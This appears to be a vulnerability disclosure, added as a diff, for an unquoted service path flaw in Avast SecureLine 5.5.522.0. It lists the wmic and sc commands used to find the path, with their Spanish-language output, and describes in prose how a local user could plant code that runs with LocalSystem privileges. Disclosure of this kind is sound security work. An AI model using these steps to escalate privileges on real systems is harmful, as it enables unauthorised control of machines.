@@ -1,0 +1,37 @@
+# Exploit Title: AVAST SecureLine 5.5.522.0 - 'SecureLine' Unquoted Service Path
+# Discovery by: Roberto Piña
+# Discovery Date: 2020-03-24
+# Vendor Homepage:https://www.avast.com/
+# Software Link :https://www.avast.com/es-mx/download-thank-you.php?product=SLN&locale=es-mx
+# Tested Version: 5.5.522.0
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 8.1 Single Language x32 es
+
+# Step to discover Unquoted Service Path: 
+
+C:\>wmic service get name, pathname, displayname, startmode | findstr "Auto" | f
+indstr /i /v "C:\Windows\\" | findstr /i "Avast SecureLine" | findstr /i /v """
+Avast SecureLine
+         SecureLine                       C:\Program Files\AVAST Software\SecureLine\VpnSvc.exe                                         
+                                                       Auto
+
+C:\>sc qc SecureLine
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: SecureLine
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\AVAST Software\SecureLine\VpnSvc.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Avast SecureLine
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+
+# Exploit:
+# A successful attempt would require the local user to be able to insert their code in the system root path 
+# undetected by the OS or other security applications where it could potentially be executed during 
+# application startup or reboot. If successful, the local user's code would execute with the elevated 
+# privileges of the application.
